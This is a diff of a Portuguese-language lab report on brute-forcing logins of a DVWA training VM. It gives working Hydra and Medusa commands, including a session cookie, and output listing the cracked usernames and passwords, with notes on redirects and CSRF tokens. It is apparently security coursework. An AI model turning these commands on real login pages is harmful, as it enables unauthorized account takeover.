@@ -96,15 +96,31 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-07 11:29:
 
 ---
 
-## 5. Ataque 2 – DVWA (Login)
+## 5. Ataque 2 – DVWA
+
+Dois alvos distintos foram testados dentro do DVWA, com comportamentos diferentes:
+
+### 5.1 `login.php` (autenticação geral)
+
+Esse endpoint não é protegido por token CSRF nesta versão do DVWA (confirmado
+via "Ver código-fonte" da página: o formulário não contém nenhum campo oculto
+`user_token`), e seu comportamento não muda conforme o nível de segurança
+selecionado no "DVWA Security" — por isso não há distinção de Low/Medium/High
+aqui.
+
+**Medusa** (módulo `web-form`): falhou. O `login.php` segue o padrão
+PRG (Post/Redirect/Get) — a resposta ao POST é um 302 vazio, e a string
+"Login failed" só aparece na página seguinte, após o redirect. O Medusa não
+segue esse redirect, então nunca encontra a condição de sucesso/falha.
+
+**Hydra** (módulo `http-post-form`): funcionou. Ele segue o redirect 302
+corretamente e avalia a string na página de destino.
 
 ```bash
 hydra 'http-post-form://192.168.56.101/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed' \
       -L /home/kali/wordlists/usuarios.txt \
       -P /home/kali/wordlists/senhas.txt -t 5 > hydra_dvwa.txt
 ```
-
-### 5.1 Resultados (níveis Low/Medium)
 
 ```
 [80][http-post-form] host: 192.168.56.101 login: 1337    password: charley
@@ -114,23 +130,42 @@ hydra 'http-post-form://192.168.56.101/dvwa/login.php:username=^USER^&password=^
 [80][http-post-form] host: 192.168.56.101 login: smithy  password: password
 ```
 
-**5 credenciais válidas** encontradas nos níveis **Low** e **Medium** —
-`1 of 1 target successfully completed, 5 valid passwords found` (Hydra,
-execução de 2026-11-06 18:39–18:43, ~955 tentativas/min).
+**5 credenciais válidas** encontradas — `1 of 1 target successfully completed,
+5 valid passwords found`.
 
 ![Painel do DVWA após login bem-sucedido](images/dvwa-panel.png)
 
-### 5.2 Falha no nível High
+### 5.2 `vulnerabilities/brute/` (laboratório de força bruta)
 
-Não foi possível atacar o nível **High** porque o login requer um **token CSRF** e um redirecionamento 302 (PRG) que nem Hydra nem Medusa conseguem manipular dinamicamente.
+Diferente do `login.php`, esse endpoint exige uma sessão já autenticada
+(cookie `PHPSESSID` válido) e seu comportamento **muda conforme o nível de
+segurança** selecionado no DVWA Security — inclusive com proteção de token
+CSRF nos níveis mais altos.
 
-### 5.3 Medusa vs Hydra (DVWA)
+**Medusa**, com o cookie de sessão autenticada e nível **Low**, funcionou:
 
-* **Medusa**: possui módulo `web‑form` que suporta POST, porém **não extrai tokens CSRF nem segue redirecionamentos 302 (PRG)**. Isso afeta **todos os níveis** (Low, Medium e High), pois o login.php do DVWA utiliza o padrão PRG (Post/Redirect/Get) que exige o tratamento correto do cabeçalho Location após o POST — algo que o módulo web-form da Medusa não consegue fazer de forma confiável. Portanto, a falha não é exclusiva do nível High.
+```bash
+medusa -h 192.168.56.101 -U /home/kali/wordlists/usuarios.txt -P /home/kali/wordlists/senhas.txt \
+-M web-form \
+-m FORM:"/dvwa/vulnerabilities/brute/index.php" \
+-m FORM-DATA:"get?username=&password=&Login=Submit" \
+-m DENY-SIGNAL:"Username and/or password incorrect." \
+-m CUSTOM-HEADER:"Cookie: PHPSESSID=8e4a2cdc687496b2a45d633248b420dc; security=low" \
+-t 20 -v 6 | grep 'SUCCESS'
+2026-11-07 13:41:10 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: 1337 Password: charley [SUCCESS]
+2026-11-07 13:41:11 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
+2026-11-07 13:41:14 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: gordonb Password: abc123 [SUCCESS]
+2026-11-07 13:41:19 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: pablo Password: letmein [SUCCESS]
+2026-11-07 13:41:23 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: smithy Password: password [SUCCESS]
 
-* **Hydra**: também não lida com tokens CSRF nem segue o fluxo PRG. Contudo, o Hydra tem melhor suporte a formulários HTTP, funcionando nos níveis **Low e Medium** (onde o login não exige token CSRF). No nível **High**, o Hydra falha exclusivamente pela ausência de token CSRF no formulário submetido.
+```
 
-* **Resumo**: O Medusa falha em **todos os níveis** (Low, Medium e High) devido à incapacidade de seguir o redirect 302 do padrão PRG do login.php. Já o Hydra funciona em Low/Medium e falha apenas no High, por causa da ausência de token CSRF que impede a validação no nível mais restrito.
+### 5.3 Resumo comparativo
+
+| Endpoint | Protegido por nível? | CSRF? | Medusa | Hydra |
+|---|---|---|---|---|
+| `login.php` | Não | Não (confirmado via view-source) | Falha (não segue PRG) | Funciona |
+| `vulnerabilities/brute/` | Sim | Sim, a partir de certo nível | Funciona (testado só em Low) | Não testado |
 
 ---
 
